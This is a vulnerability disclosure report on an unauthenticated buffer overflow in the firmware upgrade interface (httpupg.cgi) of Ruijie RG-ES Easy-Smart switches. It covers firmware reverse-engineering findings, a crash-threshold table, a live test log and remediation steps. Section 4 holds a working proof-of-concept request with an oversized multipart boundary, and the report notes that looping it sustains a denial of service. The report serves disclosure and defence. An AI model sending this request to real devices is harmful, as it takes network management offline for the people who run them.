# CVE Report: Unauthenticated Buffer Overflow Denial of Service in Ruijie RG-ES Series Switches (httpupg.cgi)

> English Version | [中文版](CVE_RG-ES_未授权缓冲区溢出DoS_中文.md)

## 1. Vulnerability Information

| Item | Details |
|---|---|
| Title             | Unauthenticated Buffer Overflow Denial of Service via multipart/form-data boundary in Firmware Upgrade Interface of Ruijie RG-ES Series Easy-Smart Switches |
| Type              | CWE-787: Out-of-bounds Write / CWE-120: Classic Buffer Overflow |
| Vendor            | Ruijie Networks Co., Ltd.                                    |
| Affected Products | RG-ES205GC, RG-ES206GC-P, RG-ES208GC, RG-ES210GC-LP, RG-ES210GS-P (sharing the same ESW firmware; NIS2100 series may also be affected) |
| Affected Version  | ESW_1.0(1)B1P48, Release(12211919) (firmware built 2025-09-19, downloaded from official site); older versions to be confirmed by vendor |
| Tested Device     | RG-ES208GC, Hardware v1.30 (Realtek RTL8367N SoC, 8051 bare-metal firmware), SN: G1U408T000054 |
| Discovery Method  | Firmware reverse engineering + live-device fuzzing (multi-round re-verification on 2026-10-06) |
| CVSS 3.1          | **6.8 (Medium)** — `AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H`; **5.7** if scored as adjacent-network (`AV:A`) |
| Discovery Date    | 2026-09-26                                                   |



## 2. Description

The local firmware upgrade interface `httpupg.cgi` of RG-ES series switches lacks effective length validation of the `boundary` parameter in the `Content-Type` header when processing `multipart/form-data` uploads. An **unauthenticated remote attacker** can craft a request with a boundary of approximately ≥408 bytes together with a complete multipart body, which **reliably crashes the device (100% reproducible)**: the web service becomes unresponsive for about 8–15 seconds until the watchdog resets it. The request can be sent in a loop, causing a sustained denial of service of the device's management plane; during the crash window the entire management plane (including the cloud-management channel) is unavailable.

## 3. Root Cause Analysis (with firmware reverse-engineering evidence)

**3.1 Fixed-size buffer with an ineffective length check**

The firmware contains an error-log string (file offset 0x2589E):

```
%s():%d - Error: HTTPD_MULTIPART_BOUNDARY_MAX is too small!
```

This proves a fixed-size buffer `HTTPD_MULTIPART_BOUNDARY_MAX` exists in the source (inferred ~400 bytes from the measured threshold). Dynamic testing shows the check fails to stop the copy (copy-before-check, or the flow is not aborted after the check) — overlong boundaries are still written into the buffer.

**3.2 Unbounded string-copy primitives**

Disassembly of the firmware (8051 bare-metal image, 942 KB, code banking) reveals 8 memory-bank-specialized strcpy variants in the common code area cpu 0x2508–0x2556, **all NUL-terminated only, with no length parameter**, e.g. (from cpu 0x252C):

```
MOVX A, @R1      ; read byte from XDATA source
INC  R1
MOVX @R0, A      ; write byte to XDATA destination
INC  R0
JNZ  ...         ; loop on NUL only, no length limit
```

Boundary extraction and construction of the match string (`"\r\n--" + boundary`) reach these unbounded primitives indirectly through the firmware's built-in bytecode VM.

**3.3 Overflow classification: XDATA global buffer overflow (NOT a stack overflow)**

- The 8051 hardware stack resides in the 256-byte IDATA area; a stack overflow beyond 256 bytes would wrap around at 8 bits and corrupt return addresses instantly, crashing the device within milliseconds;
- The observed crash signature — "unresponsive for 8–15 seconds, then watchdog recovery" — matches an XDATA global buffer overflow overwriting adjacent global structures (socket/task/timer control blocks) → task hang → watchdog timeout;
- Keil C51 non-reentrant "local arrays" are in fact statically allocated in XDATA, consistent with this classification.

**3.4 Trigger conditions **

Methodology: before each length tier, the device was confirmed online; after sending, liveness was probed at +3 s; on crash, watchdog recovery was timed and the next tier was tested only after full recovery.

| Boundary length | Full multipart body | Cookie | Result |
|---|---|---|---|
| 200 / 320 / 384 / 400 | ✔ | ✔ | Request stalls/times out, but **device does NOT crash** |
| **408** | ✔ | ✔ | **CRASH**, recovered in ~15 s |
| 416 | ✔ | ✔ | **CRASH**, recovered in ~15 s |
| 448 | ✔ | ✔ | **CRASH**, recovered in ~8 s |
| **448** | ✔ | **✘ (no Cookie)** | **CRASH**, recovered in ~14 s (confirmed in 2 independent runs) |
| 512 | empty body | ✔ | No crash (earlier fuzzing) |
| 448 | header lines only | ✔ | No crash (earlier fuzzing) |

Conclusions:

- **The precise threshold lies between 401 and 408 bytes** (400 does not crash; 408 does);
- The overflow occurs during upload-body processing / closing-delimiter matching (a complete multipart body is required; an empty body does not trigger it);
- **Multipart boundary parsing runs BEFORE the authentication check**: the same request without any cookie crashes the device reliably, while an unauthenticated request to a protected page (`cloud.cgi`) is correctly redirected to the login page at the same time — authentication itself works; only the `httpupg.cgi` multipart header-parsing path performs the overflowing copy before authentication.

## 4. Proof of Concept

**No credentials required.**

```
POST /httpupg.cgi HTTP/1.0
Host: <device IP>
Content-Type: multipart/form-data; boundary=<448 x 'D'>

--<448 x 'D'>
Content-Disposition: form-data; name="file"; filename="x.bin"

<64 arbitrary bytes>
--<448 x 'D'>--
```

Expected behavior: connection timeout/reset → device web UI unresponsive for ~8–15 s → automatic watchdog recovery. Looping the request causes sustained DoS.

Standalone PoC script `poc_overflow.py` is attached:

```bash
python poc_overflow.py <device IP> <md5(password)>   # authenticated variant
```

Note: the script retains the cookie-based invocation; per the 2026-10-06 re-test, omitting the Cookie header triggers the crash equally well.

## 5. Live-Device Verification Log (2026-10-06)

| Time | Test | Result |
|---|---|---|
| T0 | Baseline health check | Web service normal |
| T1 | PoC (448-byte boundary + valid session) | Request timeout → device down → **recovered in 8 s** |
| T2 | Threshold calibration 200/320/384/400 | No crash at any tier |
| T3 | Threshold calibration 408 / 416 | Crash at both, ~15 s recovery each |
| T4 | No cookie + 448-byte boundary | **Crash, 14 s recovery (confirmed twice)** |
| T5 | Control: GET `/cloud.cgi` without cookie | Correctly redirected to login page (proves auth works; only multipart parsing precedes it) |
| T6 | Final health check | Device fully recovered, no configuration loss |

## 6. Impact

- **Unauthenticated management-plane denial of service**: any attacker with network reachability (no password needed) can interrupt the management plane for 8–15 s with a single request; looping causes sustained unavailability — all Web/cloud-based management operations are interrupted;
- **Potential code-execution risk**: the overflowing content is fully attacker-controlled; the 8051 bare-metal environment has no MMU/stack protection. Although classic stack return-address hijacking does not apply, overwriting adjacent XDATA function pointers/state structures offers a theoretical path to code execution (no exploit development performed — stated as-is);
- **Low attack barrier**: no credentials required; these switches are commonly deployed at office/campus access layers with broadly exposed management interfaces.

## 7. Remediation

1. Enforce a length check before copying `boundary`: reject requests exceeding `HTTPD_MULTIPART_BOUNDARY_MAX` with HTTP 400 (the HTTP specification recommends boundary ≤70 bytes);
2. **Reorder processing: authenticate the session BEFORE parsing multipart headers** (the current order is reversed, enabling unauthenticated triggering);
3. Replace the unbounded strcpy variants with length-bounded copies (strncpy semantics); audit the entire multipart parsing path for similar calls;
4. Vendor is advised to run fuzz regression across the whole httpd header parser (in this study, oversized URI / oversized Cookie / 64 KB POST bodies did not crash the device — only the boundary path is affected, so the fix surface is contained).

